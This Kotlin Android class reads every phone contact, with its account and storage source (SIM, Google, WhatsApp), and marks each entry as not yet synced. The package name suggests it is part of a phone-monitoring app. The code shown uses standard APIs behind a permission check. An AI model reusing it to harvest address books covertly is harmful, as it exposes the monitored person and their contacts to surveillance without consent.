package com.spapp.monitoring.collectors

import android.Manifest
import android.content.Context
import android.content.pm.PackageManager
import android.database.Cursor
import android.provider.ContactsContract
import android.util.Log
import androidx.core.content.ContextCompat
import com.spapp.monitoring.data.local.SavedContactEntry

class SavedContactsCollector(private val context: Context) {

    private val TAG = "SavedContactsCollector"

    fun collectAllContacts(): List<SavedContactEntry> {
        if (ContextCompat.checkSelfPermission(context, Manifest.permission.READ_CONTACTS) != PackageManager.PERMISSION_GRANTED) {
            Log.w(TAG, "READ_CONTACTS permission not granted")
            return emptyList()
        }

        val contactsList = mutableListOf<SavedContactEntry>()
        val seenKeys = mutableSetOf<String>()

        val uri = ContactsContract.CommonDataKinds.Phone.CONTENT_URI
        val projectionWithAccount = arrayOf(
            ContactsContract.CommonDataKinds.Phone.CONTACT_ID,
            ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME,
            ContactsContract.CommonDataKinds.Phone.NUMBER,
            ContactsContract.CommonDataKinds.Phone.TYPE,
            ContactsContract.CommonDataKinds.Phone.LABEL,
            ContactsContract.RawContacts.ACCOUNT_NAME,
            ContactsContract.RawContacts.ACCOUNT_TYPE
        )

        var cursor: Cursor? = null
        try {
            cursor = context.contentResolver.query(
                uri,
                projectionWithAccount,
                null,
                null,
                "${ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME} ASC"
            )
        } catch (e: Exception) {
            Log.w(TAG, "Query with RawContacts columns failed, trying fallback projection: ${e.message}")
            try {
                // Fallback projection without ACCOUNT columns if OEM driver rejects them on Phone.CONTENT_URI
                cursor = context.contentResolver.query(
                    uri,
                    arrayOf(
                        ContactsContract.CommonDataKinds.Phone.CONTACT_ID,
                        ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME,
                        ContactsContract.CommonDataKinds.Phone.NUMBER,
                        ContactsContract.CommonDataKinds.Phone.TYPE,
                        ContactsContract.CommonDataKinds.Phone.LABEL
                    ),
                    null,
                    null,
                    "${ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME} ASC"
                )
            } catch (err: Exception) {
                Log.e(TAG, "Fallback query also failed", err)
            }
        }

        if (cursor == null) return emptyList()

        cursor.use { c ->
            val nameIdx = c.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME)
            val numberIdx = c.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER)
            val typeIdx = c.getColumnIndex(ContactsContract.CommonDataKinds.Phone.TYPE)
            val labelIdx = c.getColumnIndex(ContactsContract.CommonDataKinds.Phone.LABEL)
            val accountNameIdx = c.getColumnIndex(ContactsContract.RawContacts.ACCOUNT_NAME)
            val accountTypeIdx = c.getColumnIndex(ContactsContract.RawContacts.ACCOUNT_TYPE)

            while (c.moveToNext()) {
                val rawName = if (nameIdx >= 0) c.getString(nameIdx)?.trim() else null
                val rawNumber = if (numberIdx >= 0) c.getString(numberIdx)?.trim() else null

                if (rawName.isNullOrBlank() && rawNumber.isNullOrBlank()) continue
                val name = if (!rawName.isNullOrBlank()) rawName else rawNumber ?: "Unknown"
                val number = if (!rawNumber.isNullOrBlank()) rawNumber else ""

                val typeInt = if (typeIdx >= 0) c.getInt(typeIdx) else ContactsContract.CommonDataKinds.Phone.TYPE_MOBILE
                val customLabel = if (labelIdx >= 0) c.getString(labelIdx)?.trim() else null
                val phoneType = when (typeInt) {
                    ContactsContract.CommonDataKinds.Phone.TYPE_MOBILE -> "Mobile"
                    ContactsContract.CommonDataKinds.Phone.TYPE_HOME -> "Home"
                    ContactsContract.CommonDataKinds.Phone.TYPE_WORK -> "Work"
                    ContactsContract.CommonDataKinds.Phone.TYPE_MAIN -> "Main"
                    ContactsContract.CommonDataKinds.Phone.TYPE_OTHER -> "Other"
                    ContactsContract.CommonDataKinds.Phone.TYPE_CUSTOM -> customLabel ?: "Custom"
                    else -> "Mobile"
                }

                val accountName = if (accountNameIdx >= 0) c.getString(accountNameIdx)?.trim() ?: "" else ""
                val accountType = if (accountTypeIdx >= 0) c.getString(accountTypeIdx)?.trim() ?: "" else ""

                val storageType = resolveStorageType(accountName, accountType)

                // Deduplicate by name + digits + accountName
                val cleanDigits = number.filter { it.isDigit() || it == '+' }
                val key = "$name|$cleanDigits|$accountName"
                if (!seenKeys.add(key)) continue

                contactsList.add(
                    SavedContactEntry(
                        name = name,
                        phoneNumber = number,
                        phoneType = phoneType,
                        accountName = accountName,
                        accountType = accountType,
                        storageType = storageType,
                        synced = false
                    )
                )
            }
        }

        return contactsList
    }

    private fun resolveStorageType(accountName: String, accountType: String): String {
        val lowerType = accountType.lowercase()
        val lowerName = accountName.lowercase()

        return when {
            lowerType.contains("sim") || lowerName.contains("sim") -> {
                if (lowerName.contains("sim 2") || lowerName.contains("sim2")) "SIM 2"
                else if (lowerName.contains("sim 1") || lowerName.contains("sim1")) "SIM 1"
                else if (accountName.isNotBlank() && !lowerName.contains("account") && lowerName.length <= 15) accountName
                else "SIM"
            }
            lowerType == "com.google" || lowerType.contains("google") || accountName.contains("@") -> {
                if (accountName.contains("@")) accountName
                else if (accountName.isNotBlank()) "$accountName (Google)"
                else "Google Account"
            }
            lowerType.contains("phone") || lowerType.contains("device") || lowerName.contains("phone") || lowerName.contains("device") || (accountType.isBlank() && accountName.isBlank()) -> {
                "Phone Storage"
            }
            lowerType.contains("whatsapp") -> {
                "WhatsApp"
            }
            lowerType.contains("telegram") -> {
                "Telegram"
            }
            accountName.isNotBlank() -> {
                accountName
            }
            accountType.isNotBlank() -> {
                accountType
            }
            else -> "Phone Storage"
        }
    }
}
